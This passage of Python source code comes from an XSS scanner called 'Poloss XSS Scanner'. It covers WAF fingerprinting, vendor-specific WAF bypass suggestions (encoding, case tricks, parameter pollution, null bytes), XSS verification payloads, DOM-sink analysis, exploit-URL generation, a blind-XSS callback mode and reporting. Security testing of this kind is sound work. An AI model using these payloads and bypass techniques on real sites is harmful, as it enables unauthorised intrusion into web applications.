                
                # Check for WAF blocking
                if self.is_waf_blocked(response):
                    print(f"    {Fore.YELLOW}[!] WAF blocked test payload{Fore.RESET}")
                
                # Fingerprint WAF
                for waf_name, signatures in waf_signatures.items():
                    detected = False
                    
                    # Check headers
                    for header in signatures['headers']:
                        if any(header.lower() in h.lower() for h in response.headers):
                            detected = True
                            break
                    
                    # Check server header
                    server = response.headers.get('Server', '')
                    if any(sig.lower() in server.lower() for sig in signatures['server']):
                        detected = True
                    
                    # Check response body
                    if any(sig.lower() in response.text.lower() for sig in signatures['body']):
                        detected = True
                    
                    if detected:
                        detected_wafs.add(waf_name)
                
                # Check for generic WAF patterns
                if not detected_wafs and self.is_waf_blocked(response):
                    detected_wafs.add("Generic WAF")
                
            except Exception as e:
                logger.debug(f"WAF test error: {e}")
                continue
        
        if detected_wafs:
            self.waf_detected = True
            self.waf_type = list(detected_wafs)[0] if len(detected_wafs) == 1 else "Multiple"
            print(f"[!] {Fore.YELLOW}WAF Detected: {self.waf_type}{Fore.RESET}")
            
            # Display WAF information
            for waf in detected_wafs:
                print(f"    ├── {Fore.CYAN}{waf}{Fore.RESET}")
                
            # Provide bypass suggestions
            self.display_waf_bypass_suggestions()
        else:
            self.waf_detected = False
            print(f"[+] {Fore.GREEN}No WAF detected{Fore.RESET}")
        
        return self.waf_type
    
    def display_waf_bypass_suggestions(self):
        """Display WAF bypass suggestions"""
        print(f"\n{Fore.CYAN}[*] WAF Bypass Suggestions:{Fore.RESET}")
        
        suggestions = {
            'Cloudflare': [
                "Use Unicode encoding for keywords",
                "Try case variations (ScRiPt)",
                "Add comments between letters (scr/**/ipt)",
                "Use hex/unicode escapes (\\x3cscript\\x3e)",
                "Try overlong UTF-8 encoding",
            ],
            'ModSecurity': [
                "Use parameter pollution (?id=1&id=2)",
                "Add large comments after payload",
                "Use double URL encoding",
                "Try null byte injection",
                "Use uncommon HTTP methods",
            ],
            'AWS WAF': [
                "Use mixed case payloads",
                "Add extra whitespace (tabs, newlines)",
                "Try backslash escaping",
                "Use HTML entity variations",
                "Combine multiple encoding types",
            ],
            'Generic': [
                "Try all encoding types (HTML, URL, Unicode)",
                "Use polyglot payloads",
                "Test with different content-types",
                "Try chunked transfer encoding",
                "Test with different HTTP versions",
            ]
        }
        
        waf_to_check = self.waf_type if self.waf_type in suggestions else 'Generic'
        
        for suggestion in suggestions.get(waf_to_check, suggestions['Generic']):
            print(f"    • {suggestion}")
    
    def is_waf_blocked(self, response):
        """Enhanced WAF blocking detection"""
        # Check status codes
        blocking_codes = [403, 406, 418, 419, 429, 451, 500, 501, 503]
        if response.status_code in blocking_codes:
            return True
        
        # Check for blocking patterns in response
        block_patterns = [
            r'access\s+denied',
            r'blocked',
            r'security.+\Wviolation',
            r'forbidden',
            r'malicious',
            r'suspicious',
            r'not\s+acceptable',
            r'your\s+request.*blocked',
            r'web\s+application\s+firewall',
            r'detected.*attack',
            r'intrusion\s+detection',
            r'rejected.*security',
            r'bad\s+request',
        ]
        
        for pattern in block_patterns:
            if re.search(pattern, response.text, re.IGNORECASE):
                return True
        
        # Check for WAF-specific strings
        waf_strings = [
            'cloudflare', 'incapsula', 'imperva', 'akamai',
            'mod_security', 'modsecurity', 'big-ip', 'f5',
            'fortiweb', 'barracuda', 'sucuri', 'aws',
        ]
        
        for waf_str in waf_strings:
            if waf_str in response.text.lower():
                return True
        
        return False
    
    # ==============================
    # 7. VULNERABILITY VERIFICATION
    # ==============================
    
    def verify_vulnerability(self, vulnerability):
        """Enhanced vulnerability verification"""
        if not vulnerability:
            return False
        
        print(f"    {Fore.CYAN}[*] Verifying vulnerability...{Fore.RESET}")
        
        param_info = vulnerability['parameter']
        original_payload = vulnerability['payload']
        
        # Test with different verification payloads
        verification_payloads = [
            '<img src=x onerror=console.log("XSS_VERIFIED")>',
            '<script>console.log("XSS_VERIFIED")</script>',
            '" onfocus=console.log("XSS_VERIFIED") autofocus',
            'javascript:console.log("XSS_VERIFIED")',
            '<svg onload=console.log("XSS_VERIFIED")>',
            '`${console.log("XSS_VERIFIED")}`',
        ]
        
        verification_success = 0
        
        for ver_payload in verification_payloads:
            try:
                response = self.send_request_with_payload(param_info, ver_payload)
                
                # Check if payload appears in response
                if ver_payload in response.text:
                    # Check context
                    contexts = self.detect_reflection_points(
                        param_info['name'], ver_payload, response.text
                    )
                    
                    for context in contexts:
                        if self.is_exploitable(context, ver_payload, response.text):
                            verification_success += 1
                            break
                
            except Exception as e:
                logger.debug(f"Verification error: {e}")
                continue
        
        # Require at least 2 successful verifications
        verified = verification_success >= 2
        
        if verified:
            print(f"    {Fore.GREEN}[✓] Vulnerability verified ({verification_success}/6 tests passed){Fore.RESET}")
        else:
            print(f"    {Fore.YELLOW}[!] Verification failed ({verification_success}/6 tests passed){Fore.RESET}")
        
        return verified
    
    def is_exploitable(self, context, payload, response_text):
        """
        Enhanced exploitability check
        """
        context_type = context.get('context', 'direct')
        
        # Always exploitable in these contexts
        if context_type in ['javascript', 'script_tag']:
            # Check if we can break out of string context
            if any(breakout in payload for breakout in ['";', "';", '`;', '</script>']):
                return True
        
        # Check HTML body context
        if context_type == 'html_body':
            # Not inside comment
            if not self.is_inside_comment(context['position'], response_text):
                return True
        
        # Check attribute context
        if context_type in ['html_attribute', 'html_attribute_single']:
            # Check if it's an event handler
            for handler in self.event_handlers:
                if handler in context['raw_match'].lower():
                    return True
            
            # Check if we can break out of attribute
            if '"' in payload or "'" in payload or '>' in payload:
                return True
        
        # Check URL context
        if context_type == 'url':
            # Check for javascript: or data: schemes
            if 'javascript:' in payload.lower() or 'data:' in payload.lower():
                return True
        
        # Default: consider exploitable if not in comment
        return not self.is_inside_comment(context['position'], response_text)
    
    def is_inside_comment(self, position, text):
        """Check if position is inside HTML comment"""
        # Find last comment start before position
        last_comment_start = text.rfind('<!--', 0, position)
        if last_comment_start == -1:
            return False
        
        # Find next comment end after comment start
        next_comment_end = text.find('-->', last_comment_start)
        if next_comment_end == -1:
            return False
        
        # Check if position is between comment start and end
        return last_comment_start < position < next_comment_end
    
    # ==============================
    # 8. ENHANCED DOM ANALYSIS
    # ==============================
    
    def analyze_dom(self, html_content, param_name, payload):
        """Enhanced DOM analysis"""
        vulnerabilities = []
        
        soup = BeautifulSoup(html_content, 'html.parser')
        
        # Analyze script tags
        for script in soup.find_all('script'):
            script_content = script.string
            if not script_content:
                continue
            
            # Check for DOM sinks with parameter
            for sink in self.dom_sinks:
                # Pattern: sink( ... param ... )
                pattern = rf'{re.escape(sink)}\s*\([^)]*{re.escape(param_name)}[^)]*\)'
                if re.search(pattern, script_content, re.IGNORECASE):
                    vuln = {
                        'type': 'DOM-based XSS',
                        'parameter': {'name': param_name, 'type': 'dom'},
                        'payload': payload,
                        'context': {'context': 'dom_sink', 'sink': sink},
                        'confidence': 'high',
                        'location': 'script'
                    }
                    vulnerabilities.append(vuln)
        
        # Analyze inline event handlers
        for tag in soup.find_all(True):
            for attr, value in tag.attrs.items():
                if isinstance(value, str) and param_name in value:
                    # Check if it's an event handler
                    if attr.startswith('on') and len(attr) > 2:
                        vuln = {
                            'type': 'DOM-based XSS',
                            'parameter': {'name': param_name, 'type': 'dom'},
                            'payload': payload,
                            'context': {'context': 'event_handler', 'handler': attr},
                            'confidence': 'high',
                            'location': f'{tag.name}[{attr}]'
                        }
                        vulnerabilities.append(vuln)
                    
                    # Check for javascript: URLs
                    if attr in ['href', 'src', 'action', 'data']:
                        if 'javascript:' in value.lower() or 'data:' in value.lower():
                            vuln = {
                                'type': 'DOM-based XSS',
                                'parameter': {'name': param_name, 'type': 'dom'},
                                'payload': payload,
                                'context': {'context': 'javascript_url', 'attribute': attr},
                                'confidence': 'medium',
                                'location': f'{tag.name}[{attr}]'
                            }
                            vulnerabilities.append(vuln)
        
        return vulnerabilities
    
    # ==============================
    # 9. MAIN SCANNING ENGINE
    # ==============================
    
    def scan(self):
        """Main scanning function with enhanced error handling"""
        self.stats['start_time'] = time.time()
        
        try:
            # Display banner
            self.print_banner()
            
            # Step 1: Parameter Mining
            print(f"\n{Fore.GREEN}[*] Starting parameter mining...{Fore.RESET}")
            parameters = self.mine_parameters()
            
            # Check if any parameters found
            total_params = sum(len(params) for params in self.discovered_params.values())
            if total_params == 0:
                print(f"{Fore.YELLOW}[!] No parameters found to test{Fore.RESET}")
                self.generate_report()
                return
            
            # Step 2: WAF Detection
            self.detect_waf()
            
            # Step 3: Prepare parameters
            all_params = []
            for param_type, params in self.discovered_params.items():
                # Validate each parameter
                for param in params:
                    if isinstance(param, dict) and 'name' in param:
                        all_params.append(param)
            
            print(f"\n{Fore.GREEN}[*] Starting XSS Scan{Fore.RESET}")
            print(f"{Fore.CYAN}{'─'*60}{Fore.RESET}")
            print(f"[+] Total parameters to test: {len(all_params)}")
            
            # Step 4: Run tests based on mode
            test_mode = self.options.get('mode', 'comprehensive')
            
            if test_mode == 'fast':
                # Fast mode - test first 20 parameters
                test_params = all_params[:20]
                print(f"[+] Fast mode - testing {len(test_params)} parameters")
                self.concurrent_testing(test_params, 'classic')
                
            elif test_mode == 'dom':
                # DOM-focused mode
                print(f"[+] DOM mode - testing all parameters for DOM XSS")
                self.concurrent_testing(all_params, 'dom')
                
            elif test_mode == 'blind':
                # Blind XSS mode
                if not self.blind_callback_url:
                    print(f"{Fore.YELLOW}[!] Blind mode requires callback URL (-c option){Fore.RESET}")
                    print(f"[+] Falling back to classic mode")
                    self.concurrent_testing(all_params, 'classic')
                else:
                    print(f"[+] Blind mode - testing with callback: {self.blind_callback_url}")
                    self.concurrent_testing(all_params, 'blind')
                
            elif test_mode == 'advanced':
                # Advanced mode with all techniques
                print(f"[+] Advanced mode - comprehensive testing")
                
                # Test classic XSS
                print(f"\n{Fore.GREEN}[*] Testing Classic XSS{Fore.RESET}")
                classic_vulns = self.concurrent_testing(all_params, 'classic')
                self.vulnerabilities.extend(classic_vulns)
                
                # Test DOM-based XSS
                print(f"\n{Fore.GREEN}[*] Testing DOM-based XSS{Fore.RESET}")
                dom_vulns = self.concurrent_testing(all_params, 'dom')
                self.vulnerabilities.extend(dom_vulns)
                
                # Test advanced techniques
                print(f"\n{Fore.GREEN}[*] Testing Advanced Techniques{Fore.RESET}")
                advanced_vulns = self.concurrent_testing(all_params[:30], 'advanced')  # Limit for performance
                self.vulnerabilities.extend(advanced_vulns)
                
                # Test blind XSS if callback provided
                if self.blind_callback_url:
                    print(f"\n{Fore.GREEN}[*] Testing Blind XSS{Fore.RESET}")
                    blind_vulns = self.concurrent_testing(all_params[:20], 'blind')
                    self.vulnerabilities.extend(blind_vulns)
            
            else:  # comprehensive mode (default)
                print(f"[+] Comprehensive mode - balanced testing")
                
                # Test classic XSS
                print(f"\n{Fore.GREEN}[*] Testing Classic XSS{Fore.RESET}")
                classic_vulns = self.concurrent_testing(all_params, 'classic')
                self.vulnerabilities.extend(classic_vulns)
                
                # Test DOM-based XSS
                print(f"\n{Fore.GREEN}[*] Testing DOM-based XSS{Fore.RESET}")
                dom_vulns = self.concurrent_testing(all_params, 'dom')
                self.vulnerabilities.extend(dom_vulns)
            
            # Calculate elapsed time
            self.stats['time_elapsed'] = time.time() - self.stats['start_time']
            
            # Generate final report
            self.generate_report()
            
        except KeyboardInterrupt:
            print(f"\n\n{Fore.YELLOW}[!] Scan interrupted by user{Fore.RESET}")
            self.stats['time_elapsed'] = time.time() - self.stats['start_time']
            self.generate_report()
            
        except Exception as e:
            print(f"\n{Fore.RED}[!] Scan failed: {e}{Fore.RESET}")
            import traceback
            traceback.print_exc()
            self.stats['time_elapsed'] = time.time() - self.stats['start_time']
            self.generate_report()
    
    # ==============================
    # 10. ENHANCED REPORTING
    # ==============================
    
    def create_vulnerability_record(self, param_info, payload, context, response):
        """Create vulnerability record with validation"""
        if not isinstance(param_info, dict):
            param_info = {'name': 'unknown', 'type': 'unknown'}
        
        return {
            'type': 'XSS',
            'parameter': param_info,
            'payload': payload,
            'context': context,
            'url': response.url if hasattr(response, 'url') else self.target_url,
            'response_code': response.status_code if hasattr(response, 'status_code') else 0,
            'confidence': 'high',
            'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
            'waf': self.waf_type,
            'session_id': self.session_id
        }
    
    def display_vulnerability(self, vulnerability):
        """Display vulnerability with validation"""
        if not vulnerability or not isinstance(vulnerability, dict):
            logger.error(f"Invalid vulnerability data: {vulnerability}")
            return
        
        try:
            param_info = vulnerability.get('parameter', {})
            param_name = param_info.get('name', 'unknown') if isinstance(param_info, dict) else 'unknown'
            param_type = param_info.get('type', 'unknown') if isinstance(param_info, dict) else 'unknown'
            
            print(f"\n{Fore.RED}{'!'*60}{Fore.RESET}")
            print(f"{Fore.RED}[!] XSS VULNERABILITY FOUND{Fore.RESET}")
            print(f"{Fore.RED}{'!'*60}{Fore.RESET}")
            
            print(f"  Parameter: {Fore.CYAN}{param_name}{Fore.RESET} ({param_type})")
            print(f"  Payload: {Fore.YELLOW}{self.safe_truncate(vulnerability.get('payload', ''), 100)}{Fore.RESET}")
            
            context = vulnerability.get('context', {})
            if isinstance(context, dict):
                print(f"  Context: {context.get('context', 'unknown')}")
                if context.get('sink'):
                    print(f"  Sink: {context['sink']}")
            
            print(f"  Confidence: {vulnerability.get('confidence', 'medium')}")
            
            if vulnerability.get('waf'):
                print(f"  WAF: {vulnerability['waf']}")
                if vulnerability.get('waf_bypassed'):
                    print(f"  {Fore.GREEN}[✓] WAF Bypassed{Fore.RESET}")
            
            # Show exploit example
            print(f"\n  {Fore.GREEN}[*] Exploit Example:{Fore.RESET}")
            
            if param_type in ['url', 'query']:
                parsed = urlparse(self.target_url)
                query_params = parse_qs(parsed.query)
                
                # Update the vulnerable parameter
                if param_name in query_params:
                    query_params[param_name] = [vulnerability['payload']]
                else:
                    # Add as new parameter
                    query_params[param_name] = [vulnerability['payload']]
                
                new_query = urlencode(query_params, doseq=True)
                exploit_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}?{new_query}"
                print(f"    {exploit_url}")
            
            print(f"{Fore.RED}{'='*60}{Fore.RESET}\n")
            
            # Add to vulnerabilities list
            self.vulnerabilities.append(vulnerability)
            self.stats['vulnerabilities_found'] += 1
            
        except Exception as e:
            logger.error(f"Error displaying vulnerability: {e}")
            print(f"{Fore.RED}[!] Error displaying vulnerability: {e}{Fore.RESET}")
    
    def generate_report(self):
        """Generate comprehensive scan report"""
        print(f"\n{Fore.GREEN}{'='*80}{Fore.RESET}")
        print(f"{Fore.GREEN}                      SCAN COMPLETED                      {Fore.RESET}")
        print(f"{Fore.GREEN}{'='*80}{Fore.RESET}")
        
        # Statistics
        print(f"\n{Fore.CYAN}[*] SCAN STATISTICS{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*40}{Fore.RESET}")
        print(f"  Time Elapsed: {self.stats['time_elapsed']:.2f} seconds")
        print(f"  Requests Sent: {self.stats['requests_sent']}")
        print(f"  Parameters Tested: {self.stats['parameters_tested']}")
        print(f"  WAF Blocks: {self.stats['waf_blocks']}")
        print(f"  Filtered Payloads: {self.stats['filtered_payloads']}")
        print(f"  Vulnerabilities Found: {Fore.GREEN}{len(self.vulnerabilities)}{Fore.RESET}")

        if self.no_waf_mode:
            print(f"\n{Fore.CYAN}[*] WAF MODE{Fore.RESET}")
            print(f"{Fore.CYAN}{'─'*40}{Fore.RESET}")
            print(f"  WAF Detection: {Fore.GREEN}DISABLED (--no-waf flag){Fore.RESET}")
        elif self.waf_detected:
            print(f"\n{Fore.CYAN}[*] WAF INFORMATION{Fore.RESET}")
            print(f"{Fore.CYAN}{'─'*40}{Fore.RESET}")
            print(f"  WAF Detected: {Fore.YELLOW}{self.waf_type}{Fore.RESET}")
        
        # WAF Information
        if self.waf_detected:
            print(f"\n{Fore.CYAN}[*] WAF INFORMATION{Fore.RESET}")
            print(f"{Fore.CYAN}{'─'*40}{Fore.RESET}")
            print(f"  WAF Detected: {Fore.YELLOW}{self.waf_type}{Fore.RESET}")
        
        # Vulnerability Summary
        if self.vulnerabilities:
            print(f"\n{Fore.CYAN}[*] VULNERABILITY SUMMARY{Fore.RESET}")
            print(f"{Fore.CYAN}{'─'*40}{Fore.RESET}")
            
            for i, vuln in enumerate(self.vulnerabilities, 1):
                param_info = vuln.get('parameter', {})
                param_name = param_info.get('name', 'unknown') if isinstance(param_info, dict) else 'unknown'
                param_type = param_info.get('type', 'unknown') if isinstance(param_info, dict) else 'unknown'
                
                print(f"  {i}. {Fore.RED}{param_name}{Fore.RESET} ({param_type})")
                print(f"     Payload: {self.safe_truncate(vuln.get('payload', ''), 50)}")
                print(f"     Context: {vuln.get('context', {}).get('context', 'unknown')}")
                print(f"     Confidence: {vuln.get('confidence', 'medium')}")
                
                if i < len(self.vulnerabilities):
                    print()
        else:
            print(f"\n{Fore.GREEN}[+] No vulnerabilities found{Fore.RESET}")
        
        # Recommendations
        print(f"\n{Fore.CYAN}[*] RECOMMENDATIONS{Fore.RESET}")
        print(f"{Fore.CYAN}{'─'*40}{Fore.RESET}")
        
        if self.vulnerabilities:
            print("  ✓ Implement proper input validation")
            print("  ✓ Use context-aware output encoding")
            print("  ✓ Implement Content Security Policy (CSP)")
            print("  ✓ Use frameworks with built-in XSS protection")
            print("  ✓ Regularly update and patch systems")
            print("  ✓ Conduct regular security audits")
        else:
            print("  ✓ No vulnerabilities found - good security posture!")
            print("  ✓ Continue regular security testing")
            print("  ✓ Implement defense in depth")
            print("  ✓ Keep software updated")
        
        # Save report
        self.save_report_to_file()
    
    def save_report_to_file(self):
        """Save report to file"""
        try:
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"xss_scan_report_{timestamp}.json"
            
            report_data = {
                'target': self.target_url,
                'session_id': self.session_id,
                'timestamp': time.strftime('%Y-%m-%d %H:%M:%S'),
                'platform': self.platform,
                'statistics': self.stats,
                'waf_detected': self.waf_detected,
                'waf_type': self.waf_type,
                'vulnerabilities_found': len(self.vulnerabilities),
                'vulnerabilities': self.vulnerabilities,
                'parameters_discovered': {
                    'total': sum(len(p) for p in self.discovered_params.values()),
                    'url': len(self.discovered_params['url']),
                    'form': len(self.discovered_params['form']),
                    'header': len(self.discovered_params['header']),
                    'json': len(self.discovered_params['json']),
                    'cookie': len(self.discovered_params['cookie']),
                    'file': len(self.discovered_params['file']),
                }
            }
            
            with open(filename, 'w') as f:
                json.dump(report_data, f, indent=2, default=str)
            
            print(f"\n{Fore.GREEN}[+] Detailed report saved to: {filename}{Fore.RESET}")
            
            # Also save in text format
            txt_filename = f"xss_scan_report_{timestamp}.txt"
            with open(txt_filename, 'w') as f:
                f.write(f"Poloss XSS Scanner Report\n")
                f.write(f"="*50 + "\n\n")
                f.write(f"Target URL: {self.target_url}\n")
                f.write(f"Scan Time: {report_data['timestamp']}\n")
                f.write(f"Session ID: {self.session_id}\n")
                f.write(f"Platform: {self.platform}\n\n")
                
                f.write(f"Statistics:\n")
                f.write(f"- Time Elapsed: {self.stats['time_elapsed']:.2f}s\n")
                f.write(f"- Requests Sent: {self.stats['requests_sent']}\n")
                f.write(f"- Vulnerabilities Found: {len(self.vulnerabilities)}\n\n")
                
                if self.waf_detected:
                    f.write(f"WAF Detected: {self.waf_type}\n\n")
                
                if self.vulnerabilities:
                    f.write(f"Vulnerabilities:\n")
                    f.write(f"-"*30 + "\n")
                    for i, vuln in enumerate(self.vulnerabilities, 1):
                        param_info = vuln.get('parameter', {})
                        param_name = param_info.get('name', 'unknown') if isinstance(param_info, dict) else 'unknown'
                        f.write(f"{i}. Parameter: {param_name}\n")
                        f.write(f"   Payload: {vuln.get('payload', '')}\n")
                        f.write(f"   Context: {vuln.get('context', {}).get('context', 'unknown')}\n")
                        f.write(f"   Confidence: {vuln.get('confidence', 'medium')}\n\n")
            
            print(f"{Fore.GREEN}[+] Text report saved to: {txt_filename}{Fore.RESET}")
            
        except Exception as e:
            print(f"{Fore.RED}[!] Error saving report: {e}{Fore.RESET}")

def main():
    """Main entry point with platform-specific optimizations"""
    parser = argparse.ArgumentParser(
        description='Poloss XSS Scanner v3.0 - Advanced XSS Vulnerability Scanner',
        formatter_class=argparse.RawDescriptionHelpFormatter,
        epilog=f"""
{Fore.CYAN}Examples:{Fore.RESET}
  Basic scan:              python3 poloss_xss.py -u http://example.com/test.php?id=1
  Fast mode:               python3 poloss_xss.py -u http://example.com -m fast -t 20
  DOM XSS scan:            python3 poloss_xss.py -u http://example.com -m dom
  Blind XSS:               python3 poloss_xss.py -u http://example.com -m blind -c http://your-callback.com
  Advanced scan:           python3 poloss_xss.py -u http://example.com -m advanced -t 15
  With proxy:              python3 poloss_xss.py -u http://example.com --proxy http://127.0.0.1:8080
  With custom headers:     python3 poloss_xss.py -u http://example.com -H "Cookie: session=abc123"
  With crawling:           python3 poloss_xss.py -u http://example.com --crawl
  No WAF scan:             python3 poloss_xss.py -u http://example.com --no-waf
  Verbose output:          python3 poloss_xss.py -u http://example.com -v

{Fore.YELLOW}Platform Support:{Fore.RESET}
  • Termux: Full support with color output
  • Kali Linux: Optimized for security testing
  • WSL: Windows Subsystem for Linux support
  • macOS/Linux: Full compatibility

{Fore.GREEN}Features:{Fore.RESET}
  • Advanced WAF detection and bypass
  • DOM-based XSS detection
  • Blind XSS support
  • Concurrent scanning
  • Comprehensive reporting
  • Platform-specific optimizations
        """
    )
    
    parser.add_argument('-u', '--url', required=True, help='Target URL to scan')
    parser.add_argument('-m', '--mode', default='comprehensive',
                       choices=['fast', 'comprehensive', 'dom', 'blind', 'advanced'],
                       help='Scanning mode (default: comprehensive)')
    parser.add_argument('-t', '--threads', type=int, default=10,
                       help='Number of concurrent threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0.1,
                       help='Delay between requests in seconds (default: 0.1)')
    parser.add_argument('-T', '--timeout', type=int, default=10,
                       help='Request timeout in seconds (default: 10)')
    parser.add_argument('-c', '--callback', help='Callback URL for blind XSS detection')
    parser.add_argument('-H', '--headers', help='Custom headers (format: "Header1:Value1;Header2:Value2")')
    parser.add_argument('--proxy', help='Proxy server (format: http://host:port)')
    parser.add_argument('--crawl', action='store_true', help='Enable page crawling')
    parser.add_argument('--max-crawl', type=int, default=10, help='Maximum pages to crawl (default: 10)')
    parser.add_argument('--max-payloads', type=int, default=50, help='Maximum payloads per parameter (default: 50)')
    parser.add_argument('--no-waf', action='store_true', help='Disable WAF detection and bypass techniques')
    parser.add_argument('-v', '--verbose', action='store_true', help='Verbose output')
    parser.add_argument('--no-color', action='store_true', help='Disable colored output')
    
    args = parser.parse_args()
    
    if args.no_color:
        class NoColor:
            def __getattr__(self, name):
                return ""
        globals()['Fore'] = NoColor()
        globals()['Style'] = NoColor()
        globals()['Back'] = NoColor()
    
    # Parse custom headers - PASTIKAN INI SEBELUM options dictionary
    custom_headers = {}  # Inisialisasi di sini
    if args.headers:
        for header in args.headers.split(';'):
            if ':' in header:
                key, value = header.split(':', 1)
                custom_headers[key.strip()] = value.strip()
    
    options = {
        'mode': args.mode,
        'threads': args.threads,
        'delay': args.delay,
        'timeout': args.timeout,
        'crawl': args.crawl,
        'max_crawl': args.max_crawl,
        'max_payloads': args.max_payloads,
        'verbose': args.verbose,
        'blind_callback': args.callback,
        'proxy': args.proxy,
        'no_waf': args.no_waf,
        'headers': custom_headers  # Sekarang custom_headers sudah terdefinisi
    }
    
    if 'ANDROID_ROOT' in os.environ:
        print(f"{Fore.CYAN}[*] Running in Termux environment{Fore.RESET}")
        # Reduce threads for better performance on mobile
        if options['threads'] > 5:
            print(f"{Fore.YELLOW}[!] Reducing threads to 5 for Termux compatibility{Fore.RESET}")
            options['threads'] = 5
    
    try:
        scanner = AdvancedXSSFuzzer(args.url, options)
        scanner.scan()
    except KeyboardInterrupt:
        print(f"\n{Fore.YELLOW}[!] Scan interrupted by user{Fore.RESET}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Fatal error: {e}{Fore.RESET}")
        import traceback
        traceback.print_exc()
        sys.exit(1)

if __name__ == '__main__':
    main()
